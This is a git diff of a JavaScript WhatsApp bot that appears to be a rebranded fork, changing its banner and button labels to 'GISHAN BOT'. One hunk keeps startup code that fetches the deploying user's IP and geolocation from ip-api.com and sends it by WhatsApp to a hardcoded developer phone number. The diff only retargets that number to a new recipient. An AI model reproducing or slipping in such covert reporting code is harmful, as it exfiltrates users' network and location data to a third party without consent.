@@ -37,7 +37,7 @@ const setting = JSON.parse(fs.readFileSync('./settings.json'))
 const { version, bugs } = require('./package.json')
 
 //ngak penting tapi jangan lu hapus
-    const banner=cfonts["render"](("Queen          Alexa"),{font:"block",color:"white",align:"center",gradient:["red","yellow"],lineHeight:2})
+    const banner=cfonts["render"](("GISHAN          BOT2"),{font:"block",color:"white",align:"center",gradient:["red","yellow"],lineHeight:2})
 
 const starts = async (hyper = new WAConnection()) => {
 
@@ -56,7 +56,7 @@ const starts = async (hyper = new WAConnection()) => {
     console.log(color('|WRN|', 'yellow'), color('Sending bot info to bot owner', 'cyan'))
 fetch(`http://ip-api.com/line`).then(res => res.text())  
         .then(bu =>{
-       hyper.sendMessage("94767043432@s.whatsapp.net", `─────「 *IP-USER* 」─────\n\n\`\`\`${bu}\`\`\`\n────────────────────`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer Hyper Mod",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./image/lakshitha.jpg'),sourceUrl:"https://wa.me/94767043432?text=welcome"}}})
+       hyper.sendMessage("94776036862@s.whatsapp.net", `─────「 *IP-USER* 」─────\n\n\`\`\`${bu}\`\`\`\n────────────────────`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer Hyper Mod",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./image/lakshitha.jpg'),sourceUrl:"https://wa.me/94776036862?text=welcome"}}})
      console.log(color('|WRN|', 'yellow'), color('Sending ip address to developer bot', 'cyan'))
    })
     hyper.on('connecting', () => {
@@ -129,7 +129,7 @@ const imageToBase64 = require('image-to-base64')
        
 
         buttons = [
-          { buttonId: `h`, buttonText: { displayText: "nice to meet you" }, type: 1 },
+          { buttonId: `h`, buttonText: { displayText: "GISHAN BOT" }, type: 1 },
                     { buttonId: `t`, buttonText: { displayText: "which person are you" }, type: 1 },
                      { buttonId: `g`, buttonText: { displayText: "girl/boy" }, type: 1 },
         ];         
@@ -164,7 +164,7 @@ const imageToBase64 = require('image-to-base64')
 
                buff = await getBuffer(`https://fdz-app.herokuapp.com/api/maker/goodbye?name=${anu_user}&picurl=${imge}&namegrp=${encodeURI(mdata.subject)}&imggrp=${ime}&member=@${anu_user}&picbg=https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTk_nUY-WcxLBvTRJPNBUKhqWA6LdZCmZG75A&usqp=CAU`);
         buttons = [
-          { buttonId: `y`, buttonText: { displayText: "Good Bye👋" }, type: 1 },
+          { buttonId: `y`, buttonText: { displayText: "Good Bye👋GBOT" }, type: 1 },
         ];
         imageMsg = (
           await hyper.prepareMessageMedia(buff, "imageMessage", {
